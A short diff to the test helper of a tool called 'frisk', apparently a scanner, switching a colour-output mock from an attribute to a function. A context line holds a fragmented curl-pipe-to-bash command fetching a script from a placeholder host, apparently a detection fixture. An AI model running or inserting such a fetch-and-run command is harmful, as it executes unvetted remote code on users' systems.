@@ -30,7 +30,7 @@ INSTALLER = "cu" + "rl -sL https://get.example.invalid/i.sh " + "| ba" + "sh"
 def run(argv: list[str]) -> tuple[int, str, str]:
     """Run frisk.cli.main in-process; return (exit code, stdout, stderr)."""
     out, err = io.StringIO(), io.StringIO()
-    with mock.patch("frisk.report._USE_COLOR", False), \
+    with mock.patch("frisk.report.use_color", return_value=False), \
             contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
         try:
             code = main(argv)
